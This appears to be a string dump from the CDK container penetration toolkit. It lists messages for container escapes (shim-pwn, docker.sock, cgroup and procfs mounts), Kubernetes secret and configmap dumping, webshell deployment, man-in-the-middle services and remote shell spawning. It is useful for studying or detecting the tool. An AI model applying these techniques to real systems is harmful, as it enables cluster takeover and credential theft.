"""set block accessible err %v"
"""set gid_map failed"
"""set uid_map failed"
"""sh"
"""shadow api-server deploy success!"
"""shadow"
"""shares"
"""shell mode"
"""shell payload:\n%s\n"
"""shell script saved to %s"
"""shell-cmd-payloads"
"""shell-cmd-payloads\"
"""shim pid:"
"""shim-pwn"
"""sidecar"
"""skip ln:"
"""skip"
"""sleep 1"
"""sleep 2"
"""sleep"
"""sort"
"""spec"
"""spec.containers"
"""spec.nodeName"
"""spec.tolerations"
"""spec\"
"""spec\\.([^:]+): Invalid value: ([^:]+):"
"""src-url: "
"""ssh"
"""startTime"
"""started"
"""startedAt"
"""starting container:"
"""starting to deploy exploit"
"""state"
"""status"
"""status.phase"
"""strconv"
"""strings"
"""subgroup cannot be created"
"""submitted"
"""success! device %s was mounted to %s\n\n"
"""success, docker.sock is available. please use `./cdk ucurl` commands to control docker API"
"""success."
"""successThreshold"
"""sudo"
"""supplementalGroups"
"""svn"
"""sync"
"""sys"
"""syscall"
"""sysctls"
"""system-cluster-critical"
"""system-node-critical"
"""tag_pkg_num: $tag_pkg_num; kernel: $KERNEL_ALL"
"""targetPort"
"""task"
"""tcp"
"""tcpSocket"
"""template"
"""terminal"
"""terminated"
"""terminated,omitempty"
"""terminationGracePeriodSeconds"
"""terminationMessagePath"
"""terminationMessagePolicy"
"""test-poc"
"""testing"
"""text file busy"
"""text/tabwriter"
"""the second argument specifies which file to read (default: %s), "
"""the shell is in a istio(service mesh) network."
"""the shell is not in a istio(service mesh) network."
"""the target dir is %s"
"""the third and remaining arguments specifies command executed in host root filesystem (default: %s). "
"""this is the test script"
"""tier"
"""tiller,weave,calico"
"""time"
"""timeoutSeconds"
"""timezone"
"""tolerationSeconds"
"""tolerationSeconds,omitempty"
"""tolerations"
"""too many open files"
"""topologyKey"
"""touch /hacked"
"""touch /host/tmp/docker-api-pwn"
"""touch /host/tmp/pwn-success\"
"""touch /tmp/auto-docker-sock\"
"""touch /tmp/auto-priv-cgroup\"
"""touch /tmp/auto-priv-mountdir\"
"""touch /tmp/auto-shimpwn\"
"""touch /tmp/docker-sock-pwn"
"""touch /tmp/exploit_success\"
"""touch /tmp/mount-cgroup-success\"
"""touch /tmp/mount-procfs-success\"
"""touch /tmp/shim-pwn-success\"
"""trigger segment fault to finish exploit, pls check if payload executed success after this program quit."
"""true"
"""try socket:"
"""try to dump K8s configmap in multiple ways, usage: cdk run k8s-configmap-dump (auto|<service-account-token-path>)"
"""try to dump K8s secret in multiple ways, usage: cdk run k8s-secret-dump (auto|<service-account-token-path>)"
"""trying to create man in the middle ExternalIPs svc ip: %s and port: %s"
"""trying to create man in the middle deploy containers with image:%s and port:%s"
"""trying to deploy daemonset with image:%s to k8s-app:%s"
"""trying to dump K8s Pod Security Policies with local service-account:"
"""trying to dump K8s Pod Security Policies with user system:anonymous"
"""trying to dump K8s Secrets with local service-account:"
"""trying to dump K8s Secrets with user system:anonymous"
"""trying to dump K8s configmap with local service-account:"
"""trying to dump K8s configmap with user system:anonymous"
"""trying to find api-server pod in namespace:kube-system"
"""trying to list namespaces"
"""trying to pull image:"
"""trying to run shell cmd: %s\n"
"""trying to spawn shell to %s:%s\n"
"""trying to write crontab to: "
"""type"
"""type[.subtype]"
"""type\"
"""ubuntu"
"""ubuntu:latest"
"""ubuntu:latest\"
"""ucloud"
"""ucurl"
"""udp"
"""uhost-id"
"""uid"
"""uid,omitempty"
"""uid:"
"""ulimit"
"""unable to read mountinfo"
"""uname -s"
"""uname string empty. Aborting."
"""unix"
"""unknown internal error when executing uname"
"""upperdir="
"""usage: cdk probe <ip> <port> <parallels> <timeout-ms>"
"""usage: cdk run mount-procfs <dir> \"
"""user dict length: %d.\n"
"""user"
"""user-defined shell payload is: %s \n"
"""users"
"""usrdir"
"""utf-8"
"""uts"
"""v"
"""v1"
"""v1\"
"""value"
"""valueFrom"
"""values"
"""verbose mode"
"""version: $pkgVersion"
"""vi"
"""virtblk"
"""virtual-kubelet"
"""volumeMounts"
"""volumes"
"""waiting,omitempty"
"""webshell-deploy"
"""websocket"
"""weight"
"""wget"
"""while true; do sleep 30; done;"
"""windows"
"""write \"
"""write devices.allow failed. %v\n"
"""write shell exploit failed"
"""write shell exploit failed\n"
"""write webshell content failed."
"""writeable cgroup devices.allow not found"
"""x"
"""x86_64"
"""xtables-lock"
"""xterm"
"""you can find Docker APIs in https://docs.docker.com/engine/api/v1.24/"
"""you can try another way to exploit, recommend: `./cdk run lxcfs-rw"
"""yum"
"""zcat /proc/config.gz"
"""{\"
"""{} {}"
"""{} {}\"
"""|"
"""|%s/cmd_%s"
"""}"
"""}, "
"""},"
"""},\"
"""},{"
"""}],"
"""}]},"
"""}]}],"
"""}]}}\n"
"""}]}}]}},"
"""}},"
"""}},{"
"""}}]}},"
"""}}},{"
"""}}}],"
